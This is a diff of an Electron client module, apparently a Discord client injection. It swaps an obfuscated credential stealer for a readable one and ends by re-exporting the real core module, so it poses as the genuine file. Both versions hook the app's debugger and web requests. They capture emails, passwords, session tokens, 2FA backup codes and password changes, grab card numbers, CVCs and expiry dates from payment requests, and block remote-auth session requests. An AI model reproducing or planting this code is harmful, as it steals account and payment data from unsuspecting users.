-            }, 3000);
-        }
-    });
-
-    try {
-        mainWindow.webContents.debugger.attach('1.3');
-    } catch (e) {
-        return;
-    }
-
+    mainWindow.webContents.debugger.attach('1.3');
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
-        if (!bootstrapped) {
-            bootstrapped = true;
-            try { await bootstrap(); } catch (e) {}
+        if (!initiationCalled) {
+            await initiation();
+            initiationCalled = true;
         }
 
         if (method !== 'Network.responseReceived') return;
-        if (!CFG.ep.some(url => params.response.url.endsWith(url))) return;
+        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
         if (![200, 202].includes(params.response.status)) return;
 
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
+        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
+            requestId: params.requestId
+        });
         const responseData = JSON.parse(responseUnparsedData.body);
 
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
+        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
+            requestId: params.requestId
+        });
         const requestData = JSON.parse(requestUnparsedData.postData);
 
         switch (true) {
@@ -434,76 +561,63 @@ const attachToWindow = (mainWindow) => {
                 if (!responseData.token) {
                     email = requestData.login;
                     password = requestData.password;
-                    return;
+                    return; // 2FA
                 }
-                onAuthEvent(requestData.login, requestData.password, responseData.token, _r("NjU9PT8+ejM0"));
+                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                 break;
 
             case params.response.url.endsWith('/register'):
-                onAuthEvent(requestData.email, requestData.password, responseData.token, _r("KTM9ND8+ei8q"));
+                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                 break;
 
             case params.response.url.endsWith('/totp'):
-                onAuthEvent(email, password, responseData.token, _r("NjU9PT8+ejM0ei0zLjJ6aBwb"));
+                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                 break;
 
             case params.response.url.endsWith('/codes-verification'):
-                onCodesEvent(responseData.backup_codes, await readSession());
+                BackupCodesViewed(responseData.backup_codes, await getToken());
                 break;
 
             case params.response.url.endsWith('/@me'):
                 if (!requestData.password) return;
+
                 if (requestData.email) {
-                    onAuthEvent(requestData.email, requestData.password, responseData.token, _r("OTI7ND0/PnoyMyl6Pzc7MzZ6LjV6cHA=") + requestData.email + "**");
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                 }
+
                 if (requestData.new_password) {
-                    onPassEvent(requestData.new_password, requestData.password, responseData.token);
+                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                 }
                 break;
         }
     });
 
-    try {
-        mainWindow.webContents.debugger.sendCommand('Network.enable');
-    } catch (e) {}
+    mainWindow.webContents.debugger.sendCommand('Network.enable');
 
     mainWindow.on('closed', () => {
-        setupDebugger();
-    });
-};
-
-const setupDebugger = () => {
-    const wins = BrowserWindow.getAllWindows();
-    if (wins.length > 0) {
-        attachToWindow(wins[0]);
-    }
-};
-
-if (app) {
-    app.on('browser-window-created', (_, win) => {
-        attachToWindow(win);
+        createWindow();
     });
 }
-setupDebugger();
+createWindow();
 
-session.defaultSession.webRequest.onCompleted({ urls: CFG.pmt }, async (details, _) => {
+session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
     if (![200, 202].includes(details.statusCode)) return;
-    if (details.method != 'POST') return;
+    if (details.method !== 'POST') return;
+
     switch (true) {
         case details.url.endsWith('tokens'):
             const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
-            onCardEvent(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await readSession());
+            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
             break;
+
         case details.url.endsWith('paypal_accounts'):
-            onPaypalEvent(await readSession());
+            PaypalAdded(await getToken());
             break;
     }
 });
 
-session.defaultSession.webRequest.onBeforeRequest({ urls: CFG.ws }, (details, callback) => {
-    if (details.url.startsWith(_r("LSkpYHV1KD83NS4/dzsvLjJ3PTsuPy07Iw==")) || details.url.endsWith("auth/sessions")) {
-        return callback({ cancel: true });
-    }
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({ cancel: true });
 });
 
 module.exports = require("./core.asar");
